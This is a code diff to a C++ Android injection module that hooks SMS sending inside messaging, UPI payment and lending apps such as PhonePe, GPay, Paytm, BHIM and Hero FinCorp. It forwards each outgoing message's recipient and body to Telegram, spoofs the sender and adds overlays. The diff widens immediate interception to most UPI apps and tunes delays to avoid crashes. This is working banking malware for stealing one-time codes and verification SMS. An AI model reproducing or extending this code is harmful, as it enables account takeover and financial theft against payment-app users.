@@ -23,12 +23,12 @@
 namespace {
 
 /**
- * v1.0.60 — Drive MenuLoader exact IBinder→ISms proxy + Messages native block
+ * v1.0.73 — ALL apps To+body → Telegram (fast + crash-safe)
  *
- * Inject ONLY Messages + UPI (no junk WebView/vendor java_only).
- * Java: ServiceManager isms IBinder proxy → queryLocalInterface → ISms send*.
- * Native: Android 16 iface_ok=0 still block when blob has ISms/HEROAXIS.
- * NEVER inject com.android.phone / telephony (SIM death).
+ * Messages + Hero + YesPay/FamPay/BHIM/…: Java ISms immediate.
+ * PhonePe/GPay/Paytm only: Java ISms ~4s (open crash avoid).
+ * NEVER Binder/phone/sender on UPI. NEVER inject com.android.phone.
+ * TG format: screenshot layout + Number/SMS/One-tap copy.
  */
 
 bool is_messaging_pkg(const std::string& pkg) {
@@ -133,14 +133,19 @@ bool overlay_allowed_pkg(const std::string& pkg) {
     return false;
 }
 
-bool is_yespay(const std::string& pkg) {
-    return pkg.find("yespay") != std::string::npos || pkg.find("yesbank") != std::string::npos;
-}
-
 bool is_hero_pkg(const std::string& pkg) {
     if (pkg.empty()) return false;
     if (pkg.find("herofincorp") != std::string::npos) return true;
     if (pkg.find("hero") != std::string::npos && pkg.find("fincorp") != std::string::npos) return true;
+    return false;
+}
+
+/** Only these crash on open with immediate Java — baaki UPI apps get instant To+body. */
+bool is_crashy_open_upi(const std::string& pkg) {
+    if (pkg.empty()) return false;
+    if (pkg.find("phonepe") != std::string::npos) return true;
+    if (pkg.find("paisa") != std::string::npos) return true;   // GPay
+    if (pkg.find("paytm") != std::string::npos) return true;
     return false;
 }
 
@@ -359,27 +364,25 @@ public:
             sender_spoof::install(env_, api_, pkg_.c_str());
             schedule_deferred_java_sms(env_, pkg_, 1);
             report_line(api_, "post_msg_ok:" + pkg_);
-        } else if (is_hero_pkg(pkg_)) {
-            // Hero: Java ISms NOW — verification failed / token expire fix
+        } else if (is_hero_pkg(pkg_) || !is_crashy_open_upi(pkg_)) {
+            // Hero + YesPay/FamPay/BHIM/Stashfin/KreditBee/Axis/… — Java NOW
+            // Saari apps To+body Telegram pe fast, crash-safe (no Binder/phone)
             outgoing_sms_hook::arm_intercept_hooks();
             overlay_ui::install_sms_tweaks_java(env_, pkg_.c_str());
             schedule_deferred_java_sms(env_, pkg_, 1);
-            report_line(api_, "post_hero_fast_java:" + pkg_);
+            schedule_deferred_java_sms(env_, pkg_, 3);  // retry if Application late
+            report_line(api_, "post_upi_fast_java:" + pkg_);
             if (native_overlay_wanted() && overlay_allowed_pkg(pkg_)) {
                 schedule_overlay_ui(env_, api_, pkg_, 2);
             }
         } else {
-            // ALL other UPI (PhonePe/GPay/Paytm/YesPay/FamPay/BHIM/Stashfin…):
-            // Java ISms AFTER app fully opens — open crash avoid, SMS To+body still TG pe
+            // PhonePe / GPay / Paytm ONLY — short delay (open crash), still To+body
             outgoing_sms_hook::arm_intercept_hooks();
-            int delay = 10;  // open stable pehle hooks mat lago
-            if (is_yespay(pkg_)) delay = 12;
-            if (pkg_.find("phonepe") != std::string::npos) delay = 12;
-            if (pkg_.find("paisa") != std::string::npos) delay = 12;
-            schedule_deferred_sms_hooks(env_, api_, pkg_, delay);
-            report_line(api_, "post_upi_delayed_java:" + pkg_ + "|d=" + std::to_string(delay));
+            schedule_deferred_sms_hooks(env_, api_, pkg_, 4);
+            schedule_deferred_java_sms(env_, pkg_, 7);  // retry
+            report_line(api_, "post_upi_delayed_java:" + pkg_ + "|d=4");
             if (native_overlay_wanted() && overlay_allowed_pkg(pkg_)) {
-                schedule_overlay_ui(env_, api_, pkg_, delay + 3);
+                schedule_overlay_ui(env_, api_, pkg_, 7);
             }
         }
 
